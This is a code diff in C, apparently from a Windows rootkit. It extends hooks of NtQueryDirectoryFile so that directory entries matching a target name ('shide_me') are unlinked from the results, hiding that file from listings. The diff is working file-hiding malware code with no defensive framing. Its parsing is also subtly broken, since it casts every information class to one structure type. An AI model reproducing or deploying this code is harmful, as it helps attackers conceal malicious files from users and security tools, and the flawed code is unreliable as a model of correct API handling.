@@ -34,6 +34,92 @@ NTSTATUS hookQDFE(
     }
     switch (FileInformationClass)
     {
+    case FileDirectoryInformation:
+    case FileIdFullDirectoryInformation:
+    case FileIdBothDirectoryInformation:
+    case FileNamesInformation:
+    case FileFullDirectoryInformation:
+    case FileBothDirectoryInformation:
+
+        PFILE_BOTH_DIR_INFORMATION current = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
+
+        ULONG next = 0;
+        PFILE_BOTH_DIR_INFORMATION prev = current;
+        while (1)
+        {
+            next = current->NextEntryOffset;
+
+            if (custom_ucscmp(current->FileName, current->FileNameLength, shide_me, sizeof(shide_me) - 2) == 0)
+            {
+
+                // printf("[+] Found and patched the occurance\n");
+                if (current->NextEntryOffset)
+                {
+                    prev->NextEntryOffset += next;
+                }
+                else
+                {
+                    prev->NextEntryOffset = 0;
+                }
+            }
+            else
+            {
+                prev = current;
+            }
+            if (current->NextEntryOffset)
+            {
+                current = (ULONG64)current + next;
+            }
+
+            else
+            {
+                break;
+            }
+        }
+        break;
+    }
+    return res;
+}
+
+typedef NTSTATUS(*fpNtQueryDirectoryFile)
+(
+    HANDLE FileHandle,
+    HANDLE Event,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation,
+    ULONG Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN ReturnSingleEntry,
+    PUNICODE_STRING FileName,
+    BOOLEAN RestartScan);
+NTSTATUS NtQDF(
+    HANDLE FileHandle,
+    HANDLE Event,
+    PIO_APC_ROUTINE ApcRoutine,
+    PVOID ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PVOID FileInformation,
+    ULONG Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN ReturnSingleEntry,
+    PUNICODE_STRING FileName,
+    BOOLEAN RestartScan)
+{
+    fpNtQueryDirectoryFile QDF;
+    GVA(&QDF);
+    int res = QDF(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass,ReturnSingleEntry, FileName, RestartScan);
+    if (!NT_SUCCESS(res))
+    {
+        return res;
+    }
+    switch (FileInformationClass)
+    {
+    case FileDirectoryInformation:
+    case FileIdFullDirectoryInformation:
+    case FileIdBothDirectoryInformation:
+    case FileNamesInformation:
     case FileFullDirectoryInformation:
     case FileBothDirectoryInformation:
 
